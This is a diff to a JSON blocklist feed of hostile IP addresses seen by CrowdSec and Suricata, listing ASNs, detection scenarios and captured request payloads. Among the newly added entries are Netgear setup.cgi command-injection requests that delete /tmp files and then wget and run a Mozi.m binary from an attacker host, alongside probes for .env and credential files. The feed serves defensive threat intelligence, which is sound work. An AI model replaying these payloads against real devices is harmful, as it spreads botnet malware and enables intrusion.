@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-04-29T01:00:00Z",
+  "generated_at": "2026-04-29T13:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
-    "total": 51,
-    "v4": 51,
+    "total": 60,
+    "v4": 60,
     "v6": 0
   },
   "items": [
@@ -27,28 +27,6 @@
       "asn_prefix": "79.124.40.0/24",
       "payloads": [
         "POST /"
-      ]
-    },
-    {
-      "ip": "20.216.170.198",
-      "family": "v4",
-      "first_seen": "2026-04-22T10:00:00Z",
-      "last_seen": "2026-04-22T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-backdoors-attempts",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.192.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
       ]
     },
     {
@@ -846,6 +824,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.11.0.0/17",
       "tags": [
         "mwl:cloud=\"gcp\""
       ],
@@ -882,6 +863,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "45102",
+      "asn_name": "ALIBABA-CN-NET Alibaba US Technology Co.",
+      "asn_prefix": "47.91.112.0/20",
       "payloads": [
         "GET /dns-query?dns=-M4BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
         "POST /dns-query",
@@ -1016,7 +1000,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "205759",
+      "asn_name": "GHOSTYNETWORKS Ghosty Networks LLC",
+      "asn_prefix": "43.228.157.0/24"
     },
     {
       "ip": "172.189.127.4",
@@ -1029,11 +1016,186 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
       "payloads": [
         "GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.341.0_30508a9c950f0b5e2e20a06fb6025062c0a6a8dd.exe?cacheHostOrigin=au.download.windowsupdate.com"
+      ]
+    },
+    {
+      "ip": "223.123.72.70",
+      "family": "v4",
+      "first_seen": "2026-04-29T04:00:00Z",
+      "last_seen": "2026-04-29T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "103.237.157.160",
+      "family": "v4",
+      "first_seen": "2026-04-29T03:00:00Z",
+      "last_seen": "2026-04-29T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "88.151.33.51",
+      "family": "v4",
+      "first_seen": "2026-04-29T03:00:00Z",
+      "last_seen": "2026-04-29T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /",
+        "GET /secrets.json",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /api/.env",
+        "GET /.cursor/mcp.json",
+        "GET /backend/.env",
+        "GET /credentials.json",
+        "GET /.env.backup",
+        "GET /laravel/.env",
+        "GET /serviceAccountKey.json"
+      ]
+    },
+    {
+      "ip": "94.26.106.206",
+      "family": "v4",
+      "first_seen": "2026-04-29T08:00:00Z",
+      "last_seen": "2026-04-29T08:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 12"
+      ],
+      "sources": [
+        "suricata"
+      ]
+    },
+    {
+      "ip": "40.124.175.233",
+      "family": "v4",
+      "first_seen": "2026-04-29T03:00:00Z",
+      "last_seen": "2026-04-29T03:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /hudson"
+      ]
+    },
+    {
+      "ip": "45.33.12.122",
+      "family": "v4",
+      "first_seen": "2026-04-29T03:00:00Z",
+      "last_seen": "2026-04-29T03:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "172.189.127.8",
+      "family": "v4",
+      "first_seen": "2026-04-29T03:00:00Z",
+      "last_seen": "2026-04-29T03:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.350.0_270f20341093f21f716d3b9044eb34ed38ecc8a0.exe?cacheHostOrigin=2.au.download.windowsupdate.com"
+      ]
+    },
+    {
+      "ip": "185.243.5.246",
+      "family": "v4",
+      "first_seen": "2026-04-29T02:00:00Z",
+      "last_seen": "2026-04-29T02:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT Mikrotik Winbox RCE Attempt (CVE-2018-14847)"
+      ],
+      "sources": [
+        "suricata"
+      ]
+    },
+    {
+      "ip": "40.124.174.148",
+      "family": "v4",
+      "first_seen": "2026-04-29T02:00:00Z",
+      "last_seen": "2026-04-29T02:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "152.32.255.94",
+      "family": "v4",
+      "first_seen": "2026-04-29T08:00:00Z",
+      "last_seen": "2026-04-29T08:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "\u00033.\\xe0Cookie: mstshash=Administrator"
       ]
     }
   ]
